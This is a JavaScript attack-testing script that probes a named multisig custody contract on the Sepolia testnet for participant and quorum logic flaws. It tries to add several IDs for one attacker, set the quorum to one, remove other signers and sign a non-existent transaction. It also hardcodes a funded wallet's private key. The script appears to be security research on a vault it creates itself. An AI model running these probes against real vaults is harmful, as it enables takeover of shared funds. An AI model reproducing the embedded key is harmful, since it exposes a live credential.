const { ethers } = require("ethers");

// === PARTICIPANT MANIPULATION ATTACKS ===
// Testing for logic flaws in participant/quorum system

const RPC_URL = "https://ethereum-sepolia.publicnode.com";
const CUSTODY_ADDRESS = "0x3B3AD30e32fFef3dD598dd3EfDf6DCC392897786";
const ATTACKER_PK = "0xa12f4dc456a8fa989f093604e702384f9691f99c3242f615fc9a1ba0d3b3eaf2"; // Funded wallet

const ABI = [
    "function createVault(bytes32 _creator) external",
    "function addParticipant(bytes32 _creator, bytes32 _participant, string _shard) external",
    "function confirmParticipant(bytes32 _creator, bytes32 _participant, bool _confirmation) external",
    "function removeParticipant(bytes32 _creator, bytes32 _participant) external",
    "function defineQuorum(bytes32 _creator, uint256 _minParticipants) external",
    "function signTransaction(bytes32 _creator, bytes32 _participant, uint256 _tx) external",
    "function getParticipants(bytes32 _creator) external view returns (bytes32[])",
    "function getQuorum(bytes32 _creator) external view returns (uint256)"
];

async function main() {
    console.log("=== PARTICIPANT MANIPULATION ATTACK TESTING ===\n");
    console.log(`Target: ${CUSTODY_ADDRESS}\n`);
    console.log("=".repeat(70));

    const provider = new ethers.providers.JsonRpcProvider(RPC_URL);
    const attacker = new ethers.Wallet(ATTACKER_PK, provider);
    const contract = new ethers.Contract(CUSTODY_ADDRESS, ABI, attacker);

    console.log(`Attacker: ${attacker.address}\n`);

    // Create test vault
    const vaultId = ethers.utils.formatBytes32String(`ManipTest${Date.now()}`);
    console.log(`[SETUP] Creating test vault...`);

    try {
        const tx = await contract.createVault(vaultId, { gasLimit: 300000 });
        await tx.wait();
        console.log(`✅ Vault created\n`);
    } catch (e) {
        console.log(`❌ Setup failed`);
        return;
    }

    console.log("=".repeat(70));
    console.log("\nATTACK VECTOR TESTS:\n");

    // Test 1: Can we add ourselves multiple times with different IDs?
    console.log("[TEST 1] Multiple Participant IDs for Same Address");
    try {
        for (let i = 1; i <= 5; i++) {
            const participantId = ethers.utils.formatBytes32String(`Attacker${i}`);
            const tx = await contract.addParticipant(vaultId, participantId, `shard${i}`, { gasLimit: 300000 });
            await tx.wait();
            console.log(`  ✅ Added participant #${i}: ${participantId.substring(0, 20)}...`);
        }

        const participants = await contract.getParticipants(vaultId);
        console.log(`\n🚨 VULNERABILITY: Added ${participants.length} participants as single attacker`);
        console.log(`Impact: Can bypass quorum requirements by controlling multiple participant slots\n`);

    } catch (e) {
        console.log(`  ✅ Protected: ${e.reason || e.message}\n`);
    }

    // Test 2: Set quorum to 1 (bypass multisig)
    console.log("[TEST 2] Set Quorum to 1 (Multisig Bypass)");
    try {
        const tx = await contract.defineQuorum(vaultId, 1, { gasLimit: 300000 });
        await tx.wait();
        const quorum = await contract.getQuorum(vaultId);

        if (quorum.eq(1)) {
            console.log(`🚨 VULNERABILITY: Quorum set to 1`);
            console.log(`Impact: Single signature approves all transactions\n`);
        }
    } catch (e) {
        console.log(`  ✅ Protected: ${e.reason || e.message}\n`);
    }

    // Test 3: Remove all participants except attacker
    console.log("[TEST 3] Remove All Other Participants");
    try {
        const participants = await contract.getParticipants(vaultId);
        let removed = 0;

        for (const p of participants.slice(1)) { // Keep first one (attacker)
            try {
                const tx = await contract.removeParticipant(vaultId, p, { gasLimit: 300000 });
                await tx.wait();
                removed++;
            } catch (e) { }
        }

        const remaining = await contract.getParticipants(vaultId);
        if (removed > 0) {
            console.log(`🚨 VULNERABILITY: Removed ${removed} participants`);
            console.log(`Remaining: ${remaining.length}`);
            console.log(`Impact: Attacker gains sole control of vault\n`);
        }
    } catch (e) {
        console.log(`  ✅ Protected: ${e.reason || e.message}\n`);
    }

    // Test 4: Confirm/unconfirm loop (state manipulation)
    console.log("[TEST 4] Rapid Confirm/Unconfirm Cycling");
    try {
        const participantId = ethers.utils.formatBytes32String("Cycle");
        await contract.addParticipant(vaultId, participantId, "test", { gasLimit: 300000 });

        for (let i = 0; i < 5; i++) {
            const tx1 = await contract.confirmParticipant(vaultId, participantId, true, { gasLimit: 300000 });
            await tx1.wait();

            const tx2 = await contract.confirmParticipant(vaultId, participantId, false, { gasLimit: 300000 });
            await tx2.wait();
        }

        console.log(`🚨 POTENTIAL ISSUE: Can toggle confirmation state repeatedly`);
        console.log(`Impact: State confusion, quorum manipulation\n`);

    } catch (e) {
        console.log(`  ✅ Protected: ${e.reason || e.message}\n`);
    }

    // Test 5: Sign non-existent transaction
    console.log("[TEST 5] Sign Non-Existent Transaction (#999)");
    try {
        const participants = await contract.getParticipants(vaultId);
        if (participants.length > 0) {
            const tx = await contract.signTransaction(vaultId, participants[0], 999, { gasLimit: 300000 });
            const receipt = await tx.wait();

            console.log(`🚨 VULNERABILITY: Can sign non-existent transactions`);
            console.log(`Transaction: ${receipt.transactionHash}`);
            console.log(`Impact: Fake signature count, bypass validation\n`);
        }
    } catch (e) {
        console.log(`  ✅ Protected: ${e.reason || e.message}\n`);
    }

    console.log("=".repeat(70));
    console.log("\n✅ PARTICIPANT MANIPULATION TESTING COMPLETE");
}

main().catch(console.error);
